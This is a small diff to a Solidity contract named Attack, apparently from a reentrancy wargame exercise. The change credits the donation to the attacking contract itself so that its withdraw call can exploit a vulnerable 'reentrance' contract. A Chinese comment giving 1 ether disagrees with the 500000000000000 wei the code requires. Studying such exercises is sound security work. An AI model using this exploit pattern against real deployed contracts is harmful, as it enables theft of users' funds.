@@ -61,7 +61,7 @@ contract Attack {
     // 攻击函数，调用时 msg.value 设为 1 ether
     function attack() external payable {
         require(msg.value == 500000000000000 wei, "Require 500000000000000 wei to attack");
-        reentrance.donate{value: 500000000000000 wei}(msg.sender);
+        reentrance.donate{value: 500000000000000 wei}(address(this));
         reentrance.withdraw(500000000000000);
     }
 
